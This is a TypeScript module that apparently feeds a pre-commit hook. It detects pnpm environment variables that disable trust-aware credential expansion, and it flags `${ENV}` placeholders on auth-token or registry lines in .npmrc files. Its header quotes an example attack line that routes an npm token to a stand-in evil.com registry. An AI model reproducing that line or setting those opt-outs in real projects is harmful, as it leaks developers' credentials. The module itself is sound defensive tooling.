/**
 * @file Shared detector for the pnpm "trust-aware env expansion" opt-out — the
 *   escape hatch pnpm 10.34.2 / 11.5.3 added when it stopped expanding
 *   `${ENV_VAR}` in repo-controlled credential settings. Consumed by BOTH the
 *   `npmrc-trust-optout-guard` hook (Bash + Edit/Write surfaces) and the
 *   commit-time `trust-gates-are-not-weakened.mts` check (code is law, DRY).
 *
 *   The threat: a malicious repo commits `.npmrc` with
 *   `//registry.evil.com/:_authToken=${NPM_TOKEN}`; old pnpm expanded the
 *   placeholder and shipped the developer's token to the attacker's registry at
 *   `pnpm install`. The fix made expansion of `_authToken` / `registry` /
 *   `@scope:registry` in repo-controlled files refuse-by-default.
 *
 *   Two opt-out env vars DISABLE that protection for a checkout:
 *
 *   - `PNPM_CONFIG_NPMRC_AUTH_FILE` (pnpm v11)
 *   - `NPM_CONFIG_USERCONFIG` pointed at a repo `.npmrc` (v10 fallback)
 *
 *   Setting either re-opens the exfiltration hole. The only legitimate use is a
 *   CI image that builds exclusively trusted first-party repos — rare, and
 *   gated behind the hook's bypass phrase.
 *
 *   This module is pure: callers pass text (a shell command, a file's
 *   about-to-land contents) and get back the list of offenses. No file or
 *   process access.
 */

/** The two env vars whose presence disables pnpm's trust-aware expansion. */
export const TRUST_OPTOUT_ENV_VARS = [
  'PNPM_CONFIG_NPMRC_AUTH_FILE',
  'NPM_CONFIG_USERCONFIG',
] as const

export type TrustOptoutEnvVar = (typeof TRUST_OPTOUT_ENV_VARS)[number]

const ENV_VAR_SET = new Set<string>(TRUST_OPTOUT_ENV_VARS)

/**
 * Pull the variable name out of a single `NAME=value`, `export NAME=value`, or
 * `NAME` assignment token. Returns undefined when the token isn't a recognized
 * env-var name we care about.
 *
 * `NPM_CONFIG_USERCONFIG` only matters when it points at a repo-local `.npmrc`
 * (the v10 attack shape) — pointing it at `~/.npmrc` or `/dev/null` is benign.
 * We can only judge the value when the assignment carries one; for a bare
 * `export NPM_CONFIG_USERCONFIG` with no value we report it (better to ask than
 * to miss the attack).
 */
function classifyAssignment(name: string, value: string | undefined): boolean {
  if (!ENV_VAR_SET.has(name)) {
    return false
  }
  if (name === 'NPM_CONFIG_USERCONFIG' && value !== undefined) {
    // The attack shape is pointing npm/pnpm config at a REPO-LOCAL `.npmrc`
    // (a relative path, or one inside the checkout) so the committed file's
    // `${ENV}` lines get expanded. A HOME / absolute path (`~/.npmrc`,
    // `$HOME/.npmrc`, `/etc/npmrc`) or `/dev/null` points AWAY from the repo
    // and is the normal, safe setup — benign.
    const v = value.replace(/^["']|["']$/g, '').trim()
    const pointsOutsideRepo =
      v.startsWith('~') ||
      v.startsWith('$HOME') ||
      v.startsWith('${HOME}') ||
      v.startsWith('/') // absolute path — not a repo-relative file
    if (pointsOutsideRepo) {
      return false
    }
    // Anything else (`.npmrc`, `./.npmrc`, `config/.npmrc`) is repo-relative →
    // the attack shape → reported.
  }
  return true
}

/**
 * Scan parsed shell command segments for a trust-opt-out env-var assignment.
 * Pass the `Command[]` from `_shared/shell-command.mts` `parseCommands()`. We
 * inspect three shapes:
 *
 *   - `NAME=value pnpm i`         → surfaces in `cmd.assignments`
 *   - `export NAME=value`         → `cmd.binary === 'export'`, arg `NAME=value`
 *   - bare `NAME=value`           → `cmd.assignments` on an empty-binary segment
 *
 * Returns the set of offending env-var names found.
 */
export function detectOptoutInCommands(
  commands: ReadonlyArray<{
    readonly binary: string
    readonly args: readonly string[]
    readonly assignments: readonly string[]
  }>,
): Set<TrustOptoutEnvVar> {
  const found = new Set<TrustOptoutEnvVar>()
  const consider = (token: string): void => {
    const eq = token.indexOf('=')
    const name = eq > 0 ? token.slice(0, eq) : token
    const value = eq > 0 ? token.slice(eq + 1) : undefined
    if (classifyAssignment(name, value)) {
      found.add(name as TrustOptoutEnvVar)
    }
  }
  for (const cmd of commands) {
    for (const a of cmd.assignments) {
      consider(a)
    }
    if (cmd.binary === 'export' || cmd.binary === 'setenv') {
      for (const a of cmd.args) {
        consider(a)
      }
    }
  }
  return found
}

/**
 * Scan an about-to-land file's text for a trust-opt-out env var assignment.
 * Catches the same vars landed into a committed shell script, workflow YAML,
 * Dockerfile, dotenv, etc. — a line that ASSIGNS or EXPORTS one of the vars.
 * Line-oriented so it works across `.sh` / `.yml` / `Dockerfile` / `.env`
 * without per-format parsing.
 *
 * Returns the offending var names paired with their 1-based line numbers.
 */
export function detectOptoutInFileText(
  text: string,
): Array<{ name: TrustOptoutEnvVar; line: number }> {
  const out: Array<{ name: TrustOptoutEnvVar; line: number }> = []
  const lines = text.split(/\r?\n/)
  for (let i = 0, { length } = lines; i < length; i += 1) {
    const line = lines[i]!
    for (const name of TRUST_OPTOUT_ENV_VARS) {
      if (!line.includes(name)) {
        continue
      }
      // Match `NAME=`, `export NAME=`, `ENV NAME=`/`ENV NAME ` (Dockerfile),
      // and YAML `NAME: value`. Require the var name as a whole token followed
      // by `=` or `:` so a mention in a comment/string without assignment
      // (e.g. documenting the var) does not false-fire on its own — but a
      // comment that still performs an assignment is intentionally caught.
      const assignRe = new RegExp(`(^|[\\s'"])${name}\\s*[:=]`)
      const dockerfileEnvRe = new RegExp(`(^|\\s)ENV\\s+${name}\\s`)
      if (assignRe.test(line) || dockerfileEnvRe.test(line)) {
        const value = line.slice(line.indexOf(name) + name.length).replace(/^\s*[:=]\s*/, '')
        if (classifyAssignment(name, value || undefined)) {
          out.push({ line: i + 1, name })
        }
      }
    }
  }
  return out
}

const AUTH_OR_REGISTRY_KEY_RE = /(?:_authToken|^registry|:registry)\s*=/

/**
 * Detect the exfiltration SHAPE in a committed `.npmrc`: an `${ENV}` (or
 * `$ENV`) placeholder on a `_authToken=` / `registry=` / `@scope:registry=`
 * line. This is exactly what pnpm's trust-aware change refuses to expand;
 * committing it is the credential-theft setup. Returns offending 1-based line
 * numbers.
 */
export function detectAuthEnvPlaceholderInNpmrc(text: string): number[] {
  const out: number[] = []
  const lines = text.split(/\r?\n/)
  for (let i = 0, { length } = lines; i < length; i += 1) {
    const raw = lines[i]!
    const trimmed = raw.trim()
    if (!trimmed || trimmed.startsWith('#') || trimmed.startsWith(';')) {
      continue
    }
    if (!AUTH_OR_REGISTRY_KEY_RE.test(trimmed)) {
      continue
    }
    // `${VAR}` or `$VAR` after the `=`.
    const value = trimmed.slice(trimmed.indexOf('=') + 1)
    if (/\$\{?[A-Za-z_]/.test(value)) {
      out.push(i + 1)
    }
  }
  return out
}
